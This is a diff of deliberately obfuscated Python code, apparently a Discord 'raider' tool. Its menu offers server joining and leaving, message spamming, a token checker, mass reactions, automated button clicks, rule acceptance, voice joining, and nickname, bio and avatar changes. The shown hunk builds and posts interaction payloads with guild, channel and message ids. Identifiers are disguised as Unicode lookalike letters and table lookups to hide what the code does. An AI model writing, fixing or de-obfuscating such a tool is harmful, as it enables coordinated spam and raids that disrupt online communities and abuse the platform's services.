𝙉𝘔𝘔𝙈𝙉𝘭𝙡𝘔𝘔𝘭𝙈𝘔𝗡𝙡𝘐𝗠𝙄𝙄𝗡𝗠𝙄𝗜𝘔𝘐𝙡𝗜𝙉𝗜𝘔𝗜𝙄𝗠[25]: {𝗡𝙈𝙈𝘔𝘕𝙡𝗹𝗠𝗠𝘭𝗠𝘔𝘕𝙡𝘐𝙈𝙄𝗜𝙉𝘔𝗜𝗜𝘔𝘐𝘭𝗜𝘕𝙄𝗠𝗜𝘐𝗠[342]: 2, 𝗡𝗠𝘔𝘔𝙉𝗹𝗹𝘔𝗠𝘭𝗠𝘔𝗡𝘭𝘐𝙈𝗜𝘐𝙉𝘔𝙄𝗜𝘔𝘐𝘭𝗜𝘕𝙄𝘔𝗜𝗜𝘔[343]: 𝘣𝘶𝙩𝙩𝗼𝘯𝘴[𝗝3𝘂𝙛𝘳𝘢𝙈𝘊𝘇𝙞𝘢9𝘿𝘭9𝙎𝘔𝗨𝘔𝙔𝙂6𝘦𝙎𝗴𝗧𝗤4𝘷𝙘𝘂𝘢.mro()[6](𝙤𝗽𝘁𝘪𝘰𝘯𝙗𝙪𝘁𝘁𝙤𝙣)][𝘕𝙈𝗠𝙈𝘕𝘭𝙡𝘔𝗠𝗹𝗠𝗠𝗡𝗹𝗜𝘔𝗜𝘐𝙉𝘔𝙄𝘐𝗠𝙄𝙡𝘐𝘕𝙄𝗠𝙄𝙄𝗠[343]]}}
-        𝗿𝙧 = 𝗿𝘦𝗾𝘂𝘦𝙨𝘵𝘀.post(𝗡𝘔𝘔𝙈𝗡𝘭𝘭𝘔𝗠𝗹𝙈𝙈𝗡𝙡𝗜𝗠𝗜𝙄𝘕𝙈𝗜𝙄𝗠𝗜𝙡𝙄𝗡𝙄𝗠𝘐𝘐𝗠[344], headers=𝗵𝘦𝙖𝙙𝗲𝗿𝙨, json=𝗷𝙨𝗼𝘯_𝙙𝗮𝘵𝙖)
+        𝙗𝙪𝘁𝙩𝗼𝘯𝘀 = []
+        𝙡𝙞𝗰𝘻𝘣𝙖 = 0
+        for 𝘅 in 𝗺𝙚𝘴𝘴𝗮𝗴𝗲𝘣𝘰𝙩𝙩𝗼𝙘𝗹𝙞𝘤𝗸[𝙄𝗡𝘐𝗡𝙡𝙡𝗜𝘔𝘐𝘐𝗹𝘔𝘭𝘭𝙄𝘭𝙡𝘕𝙉𝘐𝙡𝘭𝙈𝘕𝗹𝗡𝙡𝗠𝘐𝙈𝗜𝘔[329]]:
+            𝗽𝗿𝗶𝙣𝘁(f"{𝙧}{𝗜𝘕𝗜𝘕𝗹𝗹𝘐𝘔𝗜𝘐𝙡𝘔𝘭𝘭𝗜𝙡𝘭𝙉𝘕𝗜𝗹𝘭𝘔𝗡𝘭𝙉𝘭𝙈𝗜𝙈𝙄𝗠[91]}{𝙙𝙖𝘵𝘦𝘵𝗶𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝘐𝙉𝗜𝘕𝙡𝗹𝘐𝘔𝘐𝗜𝘭𝗠𝙡𝗹𝗜𝙡𝘭𝙉𝗡𝘐𝘭𝘭𝙈𝘕𝙡𝗡𝘭𝘔𝗜𝘔𝘐𝗠[92]}{𝙧}')}{𝙄𝘕𝗜𝘕𝘭𝗹𝙄𝗠𝙄𝗜𝗹𝙈𝘭𝘭𝙄𝙡𝗹𝗡𝙉𝗜𝗹𝘭𝗠𝗡𝙡𝘕𝗹𝘔𝗜𝙈𝗜𝘔[93]}{𝘳}{𝗜𝘕𝗜𝗡𝙡𝙡𝙄𝘔𝗜𝘐𝙡𝙈𝗹𝘭𝗜𝙡𝙡𝘕𝗡𝗜𝘭𝙡𝙈𝗡𝘭𝗡𝙡𝙈𝗜𝙈𝘐𝘔[91]}{𝗹𝗰}{𝙄𝙉𝘐𝗡𝘭𝙡𝙄𝘔𝘐𝗜𝗹𝘔𝗹𝙡𝙄𝗹𝘭𝙉𝘕𝘐𝙡𝘭𝗠𝗡𝗹𝙉𝘭𝘔𝗜𝙈𝗜𝗠[301]}{𝗿}{𝙄𝘕𝙄𝘕𝗹𝙡𝘐𝗠𝘐𝙄𝘭𝗠𝙡𝙡𝘐𝘭𝙡𝗡𝙉𝙄𝙡𝘭𝗠𝙉𝘭𝗡𝙡𝘔𝙄𝗠𝙄𝙈[93]}{𝙣𝙣}{𝘐𝙉𝘐𝗡𝘭𝘭𝗜𝙈𝘐𝘐𝙡𝙈𝗹𝗹𝗜𝙡𝗹𝙉𝗡𝘐𝗹𝙡𝗠𝗡𝗹𝙉𝘭𝘔𝘐𝙈𝘐𝘔[249]}{𝙜}")
+            𝘣𝘂𝘵𝘁𝗼𝗻𝙨.append(𝘅[𝘐𝗡𝘐𝘕𝙡𝘭𝗜𝙈𝘐𝙄𝙡𝙈𝗹𝗹𝗜𝘭𝙡𝘕𝘕𝙄𝗹𝗹𝙈𝗡𝗹𝗡𝙡𝘔𝘐𝙈𝙄𝙈[329]][0])
+            𝙡𝗶𝘤𝘻𝙗𝘢 = 𝘭𝗶𝙘𝘇𝗯𝘢 + 1
+        𝘫𝘴𝗼𝙣_𝘥𝘢𝘵𝗮 = {𝘐𝙉𝙄𝗡𝘭𝙡𝘐𝘔𝗜𝗜𝗹𝗠𝗹𝙡𝙄𝙡𝗹𝙉𝗡𝘐𝘭𝗹𝘔𝙉𝘭𝗡𝗹𝘔𝙄𝙈𝙄𝘔[305]: 3, 𝘐𝙉𝗜𝗡𝙡𝙡𝙄𝗠𝙄𝘐𝗹𝗠𝗹𝗹𝗜𝘭𝙡𝘕𝙉𝙄𝙡𝘭𝗠𝙉𝗹𝘕𝙡𝙈𝗜𝘔𝘐𝘔[330]: 𝘐𝘕𝗜𝗡𝙡𝗹𝗜𝘔𝙄𝘐𝗹𝘔𝗹𝗹𝘐𝘭𝙡𝗡𝙉𝘐𝘭𝙡𝙈𝘕𝙡𝗡𝙡𝗠𝙄𝗠𝙄𝗠[22], 𝙄𝗡𝘐𝗡𝗹𝗹𝗜𝘔𝗜𝗜𝗹𝘔𝘭𝗹𝙄𝗹𝗹𝗡𝗡𝗜𝗹𝙡𝗠𝙉𝘭𝙉𝘭𝙈𝙄𝗠𝗜𝗠[161]: 𝙜𝘶𝘪𝗹𝗱_𝘪𝙙, 𝘐𝘕𝗜𝘕𝙡𝙡𝗜𝗠𝙄𝗜𝗹𝗠𝙡𝘭𝘐𝙡𝙡𝗡𝙉𝗜𝘭𝗹𝗠𝘕𝗹𝗡𝙡𝘔𝘐𝙈𝘐𝙈[261]: 𝙘𝙝𝗮𝗻𝗻𝘦𝙡_𝘪𝗱, 𝗜𝙉𝙄𝘕𝗹𝙡𝙄𝙈𝙄𝗜𝗹𝘔𝗹𝙡𝙄𝙡𝙡𝙉𝘕𝙄𝘭𝗹𝘔𝗡𝙡𝘕𝙡𝙈𝙄𝘔𝙄𝘔[331]: 0, 𝘐𝗡𝙄𝘕𝗹𝙡𝘐𝘔𝗜𝘐𝗹𝘔𝙡𝙡𝘐𝙡𝗹𝗡𝗡𝙄𝘭𝘭𝗠𝗡𝙡𝙉𝗹𝘔𝗜𝘔𝘐𝗠[332]: 𝙢𝙚𝙨𝘀𝘢𝙜𝙚_𝘪𝗱, 𝗜𝗡𝗜𝙉𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝘭𝘭𝘕𝘕𝘐𝘭𝙡𝗠𝗡𝘭𝗡𝘭𝙈𝙄𝘔𝗜𝘔[333]: 𝘮𝘦𝘀𝙨𝗮𝗴𝘦𝗯𝗼𝙩𝙩𝘰𝙘𝙡𝙞𝗰𝗸[𝙄𝘕𝘐𝙉𝘭𝗹𝗜𝙈𝙄𝗜𝗹𝙈𝗹𝙡𝗜𝘭𝘭𝙉𝗡𝙄𝙡𝘭𝗠𝘕𝙡𝘕𝘭𝘔𝗜𝗠𝘐𝘔[334]][𝘐𝘕𝙄𝙉𝘭𝗹𝗜𝙈𝗜𝙄𝙡𝙈𝗹𝗹𝙄𝘭𝙡𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝙡𝗡𝘭𝙈𝙄𝙈𝗜𝘔[160]], 𝙄𝘕𝙄𝗡𝘭𝙡𝘐𝗠𝗜𝗜𝘭𝗠𝙡𝙡𝘐𝘭𝙡𝘕𝙉𝙄𝗹𝙡𝗠𝗡𝘭𝙉𝙡𝗠𝗜𝘔𝗜𝗠[141]: 𝘂𝘂𝗶𝘥.uuid4().hex, 𝙄𝙉𝗜𝙉𝗹𝙡𝘐𝗠𝗜𝘐𝗹𝗠𝗹𝙡𝗜𝗹𝙡𝘕𝘕𝙄𝗹𝘭𝗠𝘕𝘭𝗡𝙡𝗠𝗜𝙈𝗜𝗠[17]: {𝘐𝘕𝗜𝗡𝗹𝗹𝘐𝙈𝗜𝙄𝘭𝗠𝘭𝙡𝙄𝗹𝗹𝘕𝘕𝘐𝗹𝘭𝗠𝙉𝘭𝙉𝙡𝗠𝘐𝙈𝙄𝘔[335]: 2, 𝗜𝗡𝘐𝗡𝙡𝘭𝗜𝙈𝙄𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝘕𝘕𝗜𝙡𝗹𝙈𝗡𝘭𝙉𝗹𝙈𝙄𝘔𝘐𝙈[336]: 𝗯𝘶𝘁𝙩𝗼𝗻𝙨[𝙁𝗚𝘾5𝗱𝗬𝗪0𝙭𝗶𝗜𝙕𝘵𝙖𝗗𝘾𝗘𝘾𝘩𝗫𝘕𝘘4𝘩𝙌𝘅𝘕𝘅𝙉𝙇𝙑𝙒.mro()[5](𝗼𝗽𝘁𝗶𝙤𝗻𝘣𝘶𝙩𝘁𝗼𝙣)][𝘐𝗡𝙄𝗡𝘭𝙡𝙄𝗠𝗜𝘐𝘭𝘔𝘭𝗹𝙄𝘭𝗹𝙉𝙉𝘐𝘭𝘭𝙈𝘕𝙡𝘕𝙡𝘔𝘐𝘔𝘐𝗠[336]]}}
+        𝗿𝙧 = 𝗿𝙚𝘲𝙪𝘦𝙨𝘁𝘀.post(𝙄𝘕𝙄𝙉𝘭𝙡𝗜𝗠𝘐𝘐𝗹𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝙉𝙄𝘭𝗹𝗠𝗡𝗹𝗡𝙡𝙈𝘐𝘔𝙄𝙈[337], headers=𝗵𝘦𝗮𝘥𝗲𝘳𝙨, json=𝙟𝘀𝙤𝙣_𝙙𝙖𝘵𝙖)
     except:
-        𝗽𝗿𝗶𝙣𝘵(f"{𝘳}{𝘕𝘔𝗠𝘔𝗡𝙡𝙡𝙈𝘔𝙡𝙈𝙈𝙉𝗹𝙄𝘔𝘐𝘐𝘕𝘔𝙄𝗜𝘔𝗜𝗹𝙄𝘕𝘐𝙈𝗜𝙄𝙈[98]}{𝙙𝗮𝘁𝙚𝘁𝗶𝗺𝗲.datetime.now().strftime(f'{𝘨}{𝙉𝙈𝗠𝙈𝘕𝙡𝙡𝙈𝙈𝗹𝙈𝙈𝙉𝗹𝘐𝙈𝙄𝘐𝗡𝘔𝙄𝘐𝗠𝗜𝗹𝗜𝙉𝘐𝙈𝙄𝙄𝘔[99]}{𝘳}')}{𝙉𝘔𝘔𝘔𝙉𝘭𝘭𝗠𝙈𝙡𝙈𝗠𝙉𝗹𝙄𝘔𝘐𝘐𝘕𝗠𝗜𝙄𝘔𝗜𝗹𝙄𝘕𝗜𝙈𝘐𝘐𝘔[100]}{𝗿}{𝙉𝙈𝗠𝘔𝘕𝘭𝗹𝘔𝙈𝗹𝙈𝘔𝗡𝙡𝘐𝘔𝙄𝙄𝘕𝙈𝘐𝙄𝘔𝗜𝘭𝗜𝗡𝗜𝗠𝘐𝘐𝙈[98]}{𝗯}{𝙉𝘔𝙈𝙈𝙉𝗹𝙡𝙈𝙈𝗹𝗠𝗠𝘕𝘭𝙄𝗠𝗜𝙄𝘕𝙈𝗜𝗜𝗠𝘐𝙡𝗜𝙉𝘐𝙈𝗜𝗜𝘔[321]}{𝘳}{𝘕𝗠𝙈𝗠𝗡𝘭𝗹𝗠𝗠𝙡𝙈𝙈𝙉𝙡𝙄𝙈𝘐𝗜𝙉𝙈𝘐𝙄𝘔𝗜𝙡𝗜𝘕𝙄𝘔𝘐𝘐𝙈[100]}{𝙣𝘯}{𝙉𝗠𝘔𝙈𝘕𝘭𝘭𝘔𝘔𝗹𝙈𝘔𝘕𝘭𝙄𝗠𝙄𝗜𝘕𝙈𝘐𝘐𝗠𝙄𝙡𝙄𝙉𝘐𝗠𝗜𝘐𝘔[277]}{𝗿𝙧.text}")
+        𝙥𝘳𝙞𝙣𝘵(f"{𝙧}{𝗜𝙉𝗜𝙉𝘭𝘭𝘐𝘔𝗜𝗜𝘭𝙈𝗹𝗹𝙄𝗹𝙡𝘕𝗡𝙄𝗹𝘭𝙈𝗡𝘭𝙉𝙡𝗠𝘐𝘔𝘐𝘔[91]}{𝗱𝙖𝙩𝗲𝙩𝘪𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝗜𝘕𝘐𝘕𝙡𝘭𝗜𝘔𝗜𝘐𝘭𝘔𝘭𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝗹𝗹𝙈𝗡𝙡𝘕𝙡𝗠𝙄𝘔𝗜𝙈[92]}{𝘳}')}{𝗜𝗡𝙄𝗡𝗹𝘭𝘐𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝗜𝗹𝙡𝘕𝙉𝗜𝗹𝘭𝗠𝙉𝘭𝗡𝗹𝘔𝗜𝗠𝙄𝗠[93]}{𝙧}{𝙄𝘕𝙄𝗡𝘭𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝗹𝘐𝘭𝙡𝘕𝘕𝘐𝗹𝙡𝘔𝘕𝘭𝗡𝗹𝙈𝙄𝗠𝙄𝙈[91]}{𝗯}{𝘐𝘕𝙄𝘕𝘭𝘭𝙄𝙈𝙄𝘐𝗹𝘔𝘭𝘭𝙄𝙡𝗹𝘕𝗡𝙄𝙡𝘭𝗠𝙉𝘭𝙉𝙡𝘔𝘐𝙈𝙄𝗠[314]}{𝘳}{𝙄𝘕𝗜𝙉𝘭𝘭𝘐𝘔𝘐𝘐𝗹𝘔𝙡𝙡𝘐𝗹𝙡𝘕𝘕𝗜𝗹𝗹𝘔𝘕𝘭𝘕𝙡𝙈𝘐𝙈𝙄𝙈[93]}{𝙣𝘯}{𝙄𝘕𝗜𝙉𝙡𝗹𝗜𝘔𝗜𝙄𝗹𝙈𝗹𝙡𝗜𝘭𝙡𝘕𝗡𝗜𝗹𝙡𝘔𝗡𝘭𝗡𝙡𝙈𝙄𝙈𝗜𝘔[270]}{𝗿𝘳.text}")
 
 class Menu:
 
     def __init__(self):
-        𝘀𝘦𝘁𝙖𝘵𝘵𝗿(𝙨𝙚𝗹𝗳, 'raider', 𝗥𝗮𝗶𝗱𝙚𝘳())
-        𝙨𝗲𝘵𝗮𝘁𝘵𝘳(𝙨𝘦𝘭𝗳, 'options', {𝗡𝗠𝘔𝙈𝘕𝙡𝘭𝙈𝗠𝙡𝙈𝗠𝙉𝙡𝗜𝘔𝘐𝘐𝙉𝗠𝙄𝗜𝙈𝗜𝗹𝘐𝘕𝗜𝘔𝙄𝗜𝘔[345]: 𝘴𝗲𝗹𝘧.joiner, 𝘕𝘔𝘔𝘔𝘕𝘭𝙡𝗠𝙈𝘭𝗠𝗠𝗡𝙡𝙄𝙈𝗜𝘐𝙉𝙈𝗜𝗜𝘔𝗜𝗹𝘐𝗡𝗜𝗠𝙄𝗜𝘔[346]: 𝙨𝙚𝘭𝗳.leaver, 𝘕𝙈𝙈𝙈𝙉𝗹𝙡𝙈𝘔𝗹𝙈𝗠𝘕𝘭𝘐𝘔𝗜𝘐𝘕𝘔𝗜𝗜𝙈𝙄𝘭𝙄𝘕𝘐𝘔𝘐𝙄𝗠[347]: 𝙨𝗲𝙡𝘧.spammer, 𝙉𝘔𝘔𝙈𝗡𝙡𝙡𝘔𝗠𝙡𝙈𝘔𝘕𝘭𝙄𝘔𝙄𝗜𝘕𝙈𝙄𝘐𝗠𝗜𝙡𝗜𝘕𝘐𝗠𝘐𝘐𝙈[348]: 𝙨𝗲𝘭𝘧.Checker, 𝗡𝙈𝙈𝙈𝗡𝗹𝙡𝘔𝘔𝘭𝙈𝘔𝗡𝙡𝗜𝗠𝘐𝙄𝗡𝙈𝘐𝗜𝘔𝘐𝘭𝗜𝙉𝗜𝙈𝙄𝗜𝙈[349]: 𝘀𝙚𝙡𝗳.reactor, 𝘕𝗠𝗠𝙈𝗡𝗹𝙡𝙈𝗠𝙡𝘔𝗠𝘕𝙡𝗜𝙈𝘐𝘐𝗡𝙈𝘐𝘐𝘔𝙄𝗹𝘐𝘕𝘐𝙈𝘐𝗜𝘔[350]: 𝙨𝘦𝙡𝗳.formater, 𝗡𝙈𝙈𝙈𝗡𝗹𝙡𝙈𝘔𝘭𝙈𝙈𝗡𝗹𝘐𝘔𝗜𝗜𝙉𝙈𝘐𝗜𝙈𝘐𝘭𝗜𝗡𝗜𝙈𝗜𝙄𝙈[351]: 𝘀𝘦𝘭𝙛.button_click, 𝙉𝙈𝘔𝙈𝙉𝘭𝙡𝙈𝗠𝗹𝗠𝘔𝗡𝗹𝗜𝙈𝗜𝘐𝗡𝙈𝘐𝗜𝗠𝘐𝘭𝘐𝗡𝘐𝙈𝙄𝘐𝘔[352]: 𝘀𝙚𝗹𝙛.accept_rules, 𝘕𝙈𝗠𝗠𝗡𝘭𝘭𝗠𝗠𝘭𝗠𝘔𝘕𝙡𝗜𝙈𝗜𝙄𝗡𝗠𝗜𝙄𝙈𝙄𝗹𝙄𝗡𝙄𝘔𝙄𝙄𝘔[353]: 𝘴𝘦𝘭𝗳.Check_guild, 𝗡𝗠𝙈𝙈𝗡𝙡𝙡𝗠𝘔𝙡𝘔𝗠𝙉𝗹𝘐𝘔𝙄𝗜𝙉𝘔𝙄𝙄𝗠𝘐𝙡𝘐𝙉𝗜𝗠𝘐𝘐𝗠[295]: 𝘴𝗲𝘭𝗳.Change_bio, 𝘕𝙈𝗠𝘔𝗡𝙡𝙡𝗠𝘔𝗹𝗠𝘔𝗡𝘭𝗜𝘔𝘐𝘐𝘕𝘔𝘐𝗜𝙈𝘐𝗹𝘐𝗡𝗜𝘔𝗜𝙄𝙈[354]: 𝘴𝙚𝘭𝗳.Onliner, 𝘕𝗠𝘔𝙈𝘕𝘭𝗹𝗠𝗠𝘭𝗠𝙈𝗡𝘭𝘐𝗠𝙄𝘐𝘕𝘔𝗜𝗜𝘔𝙄𝘭𝗜𝘕𝙄𝘔𝙄𝙄𝗠[355]: 𝘴𝘦𝘭𝗳.voicejoiner, 𝘕𝘔𝘔𝗠𝙉𝗹𝘭𝙈𝘔𝗹𝙈𝗠𝘕𝙡𝙄𝗠𝘐𝘐𝘕𝙈𝘐𝙄𝙈𝘐𝙡𝘐𝙉𝘐𝘔𝙄𝗜𝘔[356]: 𝘀𝗲𝘭𝘧.Nick, 𝗡𝙈𝘔𝙈𝗡𝗹𝘭𝘔𝙈𝙡𝙈𝙈𝙉𝘭𝙄𝘔𝗜𝘐𝙉𝙈𝗜𝙄𝗠𝙄𝙡𝙄𝘕𝘐𝙈𝙄𝙄𝗠[357]: 𝘀𝗲𝙡𝗳.thread, 𝙉𝙈𝗠𝗠𝗡𝙡𝘭𝗠𝗠𝗹𝗠𝙈𝘕𝗹𝘐𝘔𝙄𝗜𝗡𝘔𝘐𝘐𝙈𝙄𝙡𝙄𝗡𝙄𝗠𝙄𝙄𝙈[358]: 𝘴𝙚𝗹𝗳.forms, 𝘕𝘔𝙈𝙈𝙉𝙡𝗹𝗠𝙈𝘭𝙈𝗠𝙉𝗹𝗜𝙈𝙄𝙄𝘕𝘔𝙄𝘐𝘔𝙄𝗹𝘐𝙉𝗜𝗠𝗜𝘐𝙈[359]: 𝘴𝗲𝗹𝘧.avatar, 𝙉𝙈𝙈𝗠𝗡𝙡𝙡𝙈𝗠𝘭𝘔𝘔𝘕𝗹𝘐𝗠𝘐𝗜𝙉𝙈𝘐𝘐𝗠𝘐𝘭𝘐𝙉𝙄𝘔𝘐𝙄𝗠[360]: 𝘀𝘦𝙡𝙛.exit})
+        𝘀𝙚𝘵𝙖𝘵𝘵𝗿(𝙨𝘦𝙡𝘧, 'raider', 𝙍𝙖𝗶𝗱𝙚𝙧())
+        𝙨𝘦𝘵𝘢𝙩𝘵𝙧(𝘴𝗲𝙡𝗳, 'options', {𝗜𝗡𝘐𝗡𝙡𝗹𝙄𝘔𝘐𝗜𝗹𝘔𝗹𝘭𝗜𝘭𝘭𝘕𝗡𝗜𝘭𝘭𝘔𝘕𝙡𝙉𝗹𝘔𝘐𝙈𝙄𝗠[338]: 𝘀𝘦𝙡𝘧.joiner, 𝙄𝘕𝙄𝗡𝗹𝗹𝘐𝘔𝙄𝗜𝘭𝗠𝘭𝙡𝙄𝙡𝘭𝘕𝘕𝙄𝗹𝙡𝗠𝘕𝗹𝙉𝗹𝗠𝙄𝙈𝙄𝙈[339]: 𝘴𝗲𝗹𝗳.leaver, 𝙄𝙉𝙄𝙉𝙡𝘭𝗜𝘔𝘐𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝙉𝙉𝘐𝘭𝘭𝗠𝙉𝙡𝗡𝙡𝘔𝘐𝗠𝗜𝙈[340]: 𝘀𝙚𝘭𝙛.spammer, 𝗜𝘕𝙄𝗡𝗹𝙡𝗜𝙈𝗜𝙄𝙡𝘔𝘭𝘭𝙄𝗹𝘭𝘕𝘕𝙄𝗹𝘭𝘔𝘕𝘭𝗡𝙡𝘔𝙄𝗠𝗜𝘔[341]: 𝙨𝘦𝘭𝗳.Checker, 𝗜𝘕𝗜𝙉𝙡𝙡𝗜𝙈𝘐𝗜𝙡𝘔𝘭𝙡𝘐𝙡𝘭𝗡𝙉𝘐𝘭𝙡𝙈𝘕𝘭𝗡𝗹𝘔𝗜𝙈𝘐𝙈[342]: 𝘴𝗲𝗹𝘧.reactor, 𝗜𝙉𝘐𝘕𝗹𝙡𝙄𝗠𝗜𝗜𝙡𝗠𝙡𝘭𝘐𝙡𝗹𝗡𝙉𝘐𝗹𝙡𝙈𝘕𝗹𝗡𝙡𝘔𝘐𝘔𝗜𝘔[343]: 𝙨𝗲𝘭𝙛.formater, 𝙄𝗡𝙄𝘕𝘭𝘭𝘐𝘔𝘐𝙄𝗹𝗠𝘭𝙡𝗜𝙡𝘭𝗡𝙉𝗜𝘭𝗹𝙈𝘕𝘭𝙉𝙡𝙈𝘐𝗠𝙄𝙈[344]: 𝙨𝙚𝗹𝘧.button_click, 𝘐𝙉𝗜𝘕𝗹𝘭𝘐𝗠𝙄𝙄𝗹𝗠𝗹𝗹𝙄𝘭𝙡𝙉𝘕𝗜𝗹𝙡𝙈𝘕𝙡𝗡𝙡𝗠𝗜𝘔𝙄𝙈[345]: 𝘀𝘦𝗹𝘧.accept_rules, 𝘐𝗡𝙄𝗡𝘭𝗹𝗜𝗠𝗜𝘐𝙡𝙈𝘭𝗹𝗜𝙡𝗹𝗡𝙉𝗜𝘭𝙡𝘔𝙉𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝙈[346]: 𝘴𝗲𝙡𝗳.Check_guild, 𝗜𝗡𝙄𝗡𝙡𝙡𝙄𝘔𝙄𝙄𝘭𝗠𝙡𝗹𝘐𝘭𝙡𝘕𝙉𝘐𝘭𝙡𝗠𝘕𝙡𝗡𝘭𝙈𝗜𝘔𝗜𝘔[288]: 𝙨𝘦𝗹𝘧.Change_bio, 𝘐𝘕𝙄𝙉𝙡𝘭𝗜𝘔𝘐𝙄𝙡𝙈𝘭𝗹𝗜𝙡𝘭𝙉𝘕𝗜𝘭𝗹𝗠𝙉𝗹𝗡𝗹𝘔𝗜𝗠𝙄𝙈[347]: 𝘀𝘦𝗹𝘧.Onliner, 𝘐𝙉𝗜𝙉𝙡𝗹𝘐𝗠𝙄𝙄𝙡𝘔𝙡𝙡𝘐𝘭𝘭𝘕𝗡𝘐𝘭𝗹𝘔𝙉𝗹𝗡𝗹𝗠𝘐𝙈𝘐𝗠[348]: 𝙨𝘦𝙡𝗳.voicejoiner, 𝗜𝘕𝗜𝗡𝙡𝘭𝘐𝗠𝗜𝗜𝗹𝙈𝙡𝘭𝗜𝙡𝗹𝘕𝘕𝙄𝗹𝙡𝗠𝙉𝗹𝙉𝗹𝗠𝘐𝙈𝘐𝘔[349]: 𝙨𝙚𝗹𝘧.Nick, 𝘐𝙉𝗜𝘕𝗹𝗹𝘐𝙈𝗜𝗜𝙡𝘔𝘭𝗹𝘐𝘭𝗹𝘕𝙉𝘐𝙡𝙡𝘔𝙉𝘭𝙉𝙡𝙈𝘐𝗠𝗜𝘔[350]: 𝘴𝙚𝙡𝗳.thread, 𝘐𝘕𝗜𝗡𝘭𝙡𝗜𝗠𝙄𝙄𝘭𝗠𝙡𝙡𝘐𝘭𝘭𝘕𝗡𝙄𝘭𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝗠𝘐𝗠[351]: 𝘴𝘦𝘭𝙛.forms, 𝗜𝙉𝗜𝙉𝙡𝗹𝘐𝗠𝘐𝗜𝘭𝗠𝗹𝘭𝘐𝗹𝘭𝗡𝘕𝘐𝘭𝘭𝙈𝘕𝙡𝙉𝙡𝙈𝗜𝙈𝘐𝘔[352]: 𝘴𝘦𝘭𝙛.avatar, 𝗜𝗡𝙄𝘕𝙡𝗹𝗜𝗠𝙄𝗜𝙡𝘔𝗹𝙡𝗜𝗹𝙡𝙉𝙉𝗜𝙡𝗹𝙈𝗡𝗹𝘕𝗹𝗠𝗜𝘔𝘐𝘔[353]: 𝘴𝗲𝗹𝙛.exit})
 
     def main_menu(self):
-        𝘤𝙤𝘯𝙨𝗼𝘭𝙚.run()
-        𝙘𝙝𝘰𝘪𝘤𝗲 = 𝗶𝙣𝙥𝙪𝘁(f'{𝗡𝗠𝘔𝘔𝙉𝗹𝘭𝗠𝘔𝗹𝘔𝘔𝗡𝙡𝗜𝙈𝙄𝙄𝗡𝗠𝘐𝗜𝙈𝗜𝘭𝘐𝗡𝘐𝙈𝙄𝗜𝗠[361]}{𝗿}{𝙉𝙈𝗠𝘔𝗡𝙡𝘭𝘔𝗠𝙡𝘔𝘔𝙉𝗹𝙄𝙈𝘐𝙄𝘕𝗠𝙄𝘐𝙈𝘐𝙡𝘐𝙉𝗜𝙈𝗜𝙄𝘔[98]}{𝘭𝗰}{𝘕𝘔𝘔𝗠𝗡𝗹𝙡𝘔𝘔𝙡𝘔𝘔𝙉𝗹𝗜𝘔𝘐𝙄𝗡𝙈𝗜𝙄𝗠𝗜𝗹𝗜𝗡𝗜𝗠𝗜𝗜𝙈[362]}{𝗿}{𝗡𝗠𝗠𝘔𝙉𝙡𝘭𝘔𝘔𝘭𝘔𝙈𝗡𝘭𝗜𝘔𝘐𝙄𝙉𝙈𝘐𝗜𝘔𝙄𝙡𝘐𝗡𝗜𝘔𝘐𝙄𝗠[164]}{𝙜}{𝗿}{𝘕𝘔𝘔𝘔𝘕𝗹𝗹𝗠𝙈𝗹𝙈𝘔𝘕𝗹𝙄𝙈𝘐𝙄𝘕𝙈𝙄𝙄𝘔𝙄𝘭𝘐𝙉𝙄𝗠𝘐𝘐𝙈[105]}')
-        if 𝘤𝗵𝗼𝗶𝘤𝗲 in 𝘴𝘦𝘭𝙛.options:
-            𝘴𝙚𝙡𝙛.options[𝘤𝗵𝘰𝙞𝗰𝘦]()
+        𝗰𝘰𝘯𝘴𝗼𝗹𝗲.run()
+        𝘤𝘩𝗼𝙞𝗰𝙚 = 𝗶𝙣𝘱𝙪𝙩(f'{𝘐𝘕𝙄𝘕𝗹𝘭𝗜𝘔𝘐𝙄𝘭𝙈𝗹𝙡𝙄𝘭𝗹𝘕𝗡𝙄𝘭𝙡𝗠𝙉𝗹𝙉𝘭𝘔𝗜𝗠𝗜𝗠[354]}{𝘳}{𝙄𝗡𝗜𝘕𝙡𝙡𝙄𝙈𝙄𝙄𝘭𝗠𝙡𝙡𝙄𝗹𝗹𝘕𝙉𝘐𝙡𝙡𝙈𝘕𝙡𝗡𝘭𝘔𝗜𝘔𝙄𝘔[91]}{𝙡𝗰}{𝙄𝘕𝘐𝘕𝗹𝙡𝗜𝙈𝗜𝙄𝘭𝘔𝘭𝙡𝙄𝙡𝗹𝙉𝙉𝗜𝘭𝘭𝗠𝗡𝘭𝙉𝘭𝗠𝘐𝘔𝘐𝘔[355]}{𝗿}{𝗜𝗡𝘐𝗡𝗹𝗹𝘐𝙈𝘐𝙄𝗹𝘔𝘭𝙡𝘐𝗹𝘭𝘕𝗡𝗜𝘭𝗹𝙈𝙉𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝙈[157]}{𝘨}{𝗿}{𝗜𝗡𝘐𝙉𝘭𝙡𝙄𝗠𝗜𝘐𝘭𝙈𝗹𝗹𝘐𝗹𝘭𝘕𝘕𝘐𝙡𝘭𝗠𝘕𝗹𝗡𝙡𝙈𝗜𝙈𝗜𝙈[98]}')
+        if 𝘤𝗵𝙤𝗶𝗰𝙚 in 𝘴𝘦𝘭𝙛.options:
+            𝘴𝗲𝗹𝘧.options[𝙘𝘩𝘰𝙞𝙘𝙚]()
         else:
-            𝙨𝙚𝗹𝗳.main_menu()
+            𝘀𝘦𝙡𝗳.main_menu()
 
     def run(self, func, args):
-        𝙩𝙝𝙧𝘦𝙖𝗱𝙨 = []
-        𝗰𝙤𝗻𝘴𝗼𝗹𝘦.render_ascii()
-        for 𝗮𝙧𝗴 in 𝙖𝘳𝙜𝘀:
